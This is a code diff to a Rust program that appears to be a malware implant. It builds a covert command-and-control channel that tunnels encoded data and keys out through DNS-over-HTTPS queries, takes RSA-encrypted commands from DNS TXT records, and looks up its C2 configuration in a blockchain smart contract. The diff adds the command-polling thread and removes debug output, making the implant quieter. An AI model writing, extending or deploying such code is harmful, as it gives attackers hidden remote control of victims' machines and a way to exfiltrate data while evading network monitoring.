@@ -30,7 +30,6 @@ use web3::{
     types::{Address, TransactionParameters, H160},
 };
 
-use reqwest::blocking::Client;
 use fancy_regex::Regex; 
 
 fn parseCertificate(response: &str) -> String{
@@ -47,21 +46,20 @@ fn parseCertificate(response: &str) -> String{
 
 }
 
+static mut SleepTime: Option<Mutex<u64>> = None;
+
 fn sendDnsRequest(domain: &str) -> Result<()>{
-    println!("Sent request to: {}", &domain);
     let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
     url.query_pairs_mut()
         .append_pair("name", domain)
         .append_pair("type", "A");
 
-    let client = Client::new();
+    let client = reqwest::blocking::Client::new();
 
     let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
 
     let mut response = request.unwrap();
     let mut data = response.text().unwrap();
-
-    println!("{}",data);
     Ok(())
 }
 
@@ -77,11 +75,9 @@ fn dnsRequestEncoder(domain: &str, message: &String){
     let messageSize = base64Data.len();
     let mut messageRemainSize = messageSize;
     let mut lastPacket = 0;
-    println!("Data: {} {} {}", &domain, &base64Data, &message);
 
 
     let mut result = String::new();
-    println!("Max DNS request size: {} | DNS domain name size: {} | Max DNS data {}", dnsMAX, dnsdomainNameSize, maxDNSData);
     
 
     for (i, c) in base64Data.chars().enumerate() {
@@ -95,7 +91,6 @@ fn dnsRequestEncoder(domain: &str, message: &String){
             result.push('.');
             result.push_str(domain);
             lastPacket = 1;
-            println!("{}", result);
             sendDnsRequest(&result);
             result.clear();
         }
@@ -107,7 +102,6 @@ fn dnsRequestEncoder(domain: &str, message: &String){
         result.push_str(&s);
         result.push('.');
         result.push_str(domain);
-        println!("{}", result);
         sendDnsRequest(&result);
         result.clear();
         lastPacket = 0;
@@ -120,20 +114,20 @@ use lazy_static::lazy_static;
 
 
 
-fn generateKeyPair() -> String{
+fn generateKeyPair() -> (String, RsaPrivateKey){
     let mut rng = rand::thread_rng();
     let bits = 2048;
     let private_key_local = RsaPrivateKey::new(&mut rng, bits).unwrap();
     let public_key = RsaPublicKey::from(&private_key_local);
     let pubkey_der = public_key.to_public_key_der().unwrap();
     let pubkey_der_string = pubkey_der.to_pem("PUBLIC KEY", LineEnding::default()).unwrap();
-    return pubkey_der_string;
+    (pubkey_der_string, private_key_local)
 
 }
 
 // generate RSA keypair and send public key to C2 over DoH
-fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> String{
-    let pubkey = generateKeyPair();
+fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> (String, RsaPrivateKey){
+    let (pubkey, privkey) = generateKeyPair();
     let pubkeyBase32 = base32::encode(
         Alphabet::RFC4648 { padding: true },
         &pubkey.as_bytes()
@@ -146,33 +140,155 @@ fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> String{
     let serverPublicKeySha256: String = format!("{:x}", result);
     let s = format!("1|{}|{}", serverPublicKeySha256, pubkeyBase32);
     dnsRequestEncoder(domain, &s);
-    return serverPublicKeySha256;
+    (serverPublicKeySha256, privkey)
 }
 use std::{thread, time};
+ 
+fn parseDNSTextEntry(response: &str) -> String{
+    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
+    let mut result = String::new();
+    
+    let mut captures_iter = re.captures_iter(response);
+    for x in captures_iter{
+        let mut data = x.unwrap().get(0).unwrap().as_str();
+        data = data.trim_end_matches("\\");
+        result.push_str(&data);
+    }
+    return result.clone()
+}
 
-fn pingServerHandler(domain: &str, public_key_hash: &str, sleepTime: &u64){
-    let ten_millis = time::Duration::from_millis(*sleepTime);
-    let s: String = format!("2|{}", public_key_hash);
-    while true{
-        dnsRequestEncoder(domain, &s);
-        thread::sleep(ten_millis);
+fn is_base32(s: &str) -> bool {
+    println!("Checking data");
+    let decode = base32::decode(Alphabet::RFC4648 { padding: true }, s);
+    if decode.is_some(){
+        return true
+    }
+    return false
+}
+
+fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey) -> Vec<String>{
+    println!("Checking TXT entry");
+    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
+    url.query_pairs_mut()
+        .append_pair("name", domain)
+        .append_pair("type", "TXT");
+    let client = reqwest::blocking::Client::new();
+    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
+    let mut response = request.unwrap();
+    let mut data = response.text().unwrap();
+
+    data = parseDNSTextEntry(&data);
+    if !is_base32(&data){
+        let commandDecoded = &base64::decode(data);
+        match commandDecoded{
+            Ok(commandDecoded) => {
+                println!("Data :: {:?}", &commandDecoded);
+                let padding = Oaep::new::<sha2::Sha256>();
+                let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
+                match dec_data{
+                    Ok(dec_data) =>{
+                        let utf_data = String::from_utf8(dec_data).unwrap();
+                        let new_string: String = utf_data.to_owned();
+                        let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
+                        println!("Data {:?}", &parts);
+                        return parts;
+                    }
+                    Err(err)=>{
+                        println!("{}", err);
+                        return vec![]
+                    }
+                }
+            }
+            Err(_) =>{
+                return vec![]
+            }
+        }
+    }
+    return vec![];
+}
+
+//fn dnsRequestEncryptEncode(domain: &str, data: &str, public_key_external: &RsaPublicKey){
+ //   let padding = Oaep::new::<sha2::Sha256>();
+  //  let mut rng = rand::thread_rng();
+   // let enc_data = public_key_external.encrypt(&mut rng, padding, &data[..]);
+   //s println!("{:?}", enc_data.unwrap());
+//}
+
+fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
+    println!("command server!");
+    unsafe{
+        if let Some(ref mutex) = SleepTime{
+            while true{
+                let mut stime = mutex.lock().unwrap();
+                let ten_millis = time::Duration::from_millis(*stime);
+                let command = checkDNSTextEntry(&domain, &private_key_internal);
+                if !command.is_empty(){
+                    match command.get(1).unwrap().as_str() {
+                        "a" => println!("o segundo elemento é um!"),
+                        "s" => {
+                                let s: String = format!("s|{}", public_key_hash);
+                                dnsRequestEncoder(domain, &s);
+                                println!("Data :: {}", command.get(2).unwrap().as_str());
+                                *stime = command.get(2).unwrap().parse().unwrap();
+                                std::mem::drop(stime);
+                            }
+                        "x" => println!("o segundo elemento é três!"),
+                        _ => println!("o segundo elemento não é válido!"),
+                    }
+                }
+                thread::sleep(ten_millis);
+            }
+        }
     }
 }
 
-//fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey){
- //   
-//}
+
+fn pingServerHandler(domain: &str, public_key_hash: &str){
+    unsafe {
+        let s: String = format!("2|{}", public_key_hash);
+        if let Some(ref mutex) = SleepTime {
+            while true{
+                let mut stime = mutex.lock();
+                match stime{
+                    Ok(stime) =>{
+                        let ten_millis = time::Duration::from_millis(*stime);
+                        std::mem::drop(stime);
+                        dnsRequestEncoder(domain, &s);
+                        thread::sleep(ten_millis);
+                    }
+                    Err(err)=>{
+                        println!("{}", err);
+                        continue;
+                    }
+                }
+            }
+        }
+    }
+}
+
 
 use std::time::Duration;
-
-fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str){
-    let mut sleepTime: u64 = 10000;
+#[allow(unused_variables)]
+fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
+    unsafe {
+        SleepTime = Some(Mutex::new(10000)); // inicializa a variável global
+    }
     let domain_clone = domain.to_string();
     let public_key_hash_clone = public_key_hash.to_string();
+    let public_key_external_clone = public_key_external.clone();
+    let private_key_clone = private_key_internal.clone();
+
     println!("ping server");
     thread::spawn(move || {
-        pingServerHandler(&domain_clone, &public_key_hash_clone, &sleepTime);
+        pingServerHandler(&domain_clone, &public_key_hash_clone);
     });
+
+    let domain_clone2 = domain.to_string();
+    let public_key_hash_clone2 = public_key_hash.to_string();
+    thread::spawn(move || {
+        commandServerHandler(&domain_clone2, &public_key_external_clone, &public_key_hash_clone2, &private_key_clone);
+    });
+
     loop {
         thread::sleep(Duration::from_secs(1));
     }
@@ -185,7 +301,7 @@ fn handleCertificate(domain: &str) -> Result<()>{
         .append_pair("name", domain)
         .append_pair("type", "TXT");
 
-    let client = Client::new();
+    let client = reqwest::blocking::Client::new();
 
     let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
 
@@ -206,8 +322,9 @@ fn handleCertificate(domain: &str) -> Result<()>{
     // let enc_data = public_key.encrypt(&mut rng, padding, &data[..]).expect("failed to encrypt");
     // println!("Decoded: {:?}", public_key);
 
-    let serverPublicKeySha256 = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());
-    serverHandler(domain, public_key_external.unwrap(), &serverPublicKeySha256);
+    let (serverPublicKeySha256, privkey) = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());
+
+    serverHandler(domain, public_key_external.unwrap(), &serverPublicKeySha256, &privkey);
 
     let s = format!("2|{}", serverPublicKeySha256);
     dnsRequestEncoder(domain, &s);
@@ -215,20 +332,36 @@ fn handleCertificate(domain: &str) -> Result<()>{
     Ok(())
 }
 
+use serde_json::Value;
+async fn handleContractKeccak(contractAddress: &str) -> String{
+    // call RPC and interact with smart contract variable name (keccak)
+
+    let mut payload = String::from(r#"{"method": "eth_call","params": [{"from": "0x0000000000000000000000000000000000000000","to": "CONTRACTADDRESS","data": "KECCAKHERE"},"latest"],"id": 1,"jsonrpc": "2.0"}"#);
+    let newPayload = payload.replace("CONTRACTADDRESS", contractAddress);
+
+
+    let mut object: Value = serde_json::from_str(&newPayload).unwrap();
+
+    let client = reqwest::Client::new();
+    let mut request = client.post(TestnetRPC)
+    .json(&object)
+    .send()
+    .await;
+
+    let response = request.unwrap().text().await.unwrap();
+    let jsonResponse: Value = serde_json::from_str(&response).unwrap();
+
+    let testing = hex::decode(&(jsonResponse["result"].as_str().unwrap()[2..])).unwrap();
+    let testStr = str::from_utf8(&testing).unwrap().replace(",","");
+    let testStr = &testStr.trim_matches('\x00')[32..];
+
+    return testStr.to_string()
+}
+
 #[tokio::main]
 async fn rpcInteract(addr: &str) -> web3::Result<(web3::Result<()>, String)>{
-    let transport = web3::transports::Http::new(TestnetRPC)?;
-    let web3 = web3::Web3::new(transport);
-    let smart_contract_addr = Address::from_str(addr).unwrap();
-
-    let contractC2 = Contract::from_json(web3.eth(), smart_contract_addr, include_bytes!("/home/user/Desktop/babagola/ContractBuild/SmartContractDeployment_contracts_HuInAgSRjrwBoUnRZBbw_sol_HuInAgSRjrwBoUnRZBbw.abi"))
-    .expect("deu ruim");
-    let C2AESContent: String = contractC2
-        .query("CONTRACTVARIABLENAME", (), None, Options::default(), None)
-        .await
-        .unwrap();
-
-    let C2AESContent_b64dec = base64::decode(C2AESContent).unwrap();
+    let contractC2 = handleContractKeccak(addr).await;
+    let C2AESContent_b64dec = base64::decode(contractC2).unwrap();
     let key_dec = base64::decode(ContractKey).unwrap();
 
     let key = &key_dec[..];
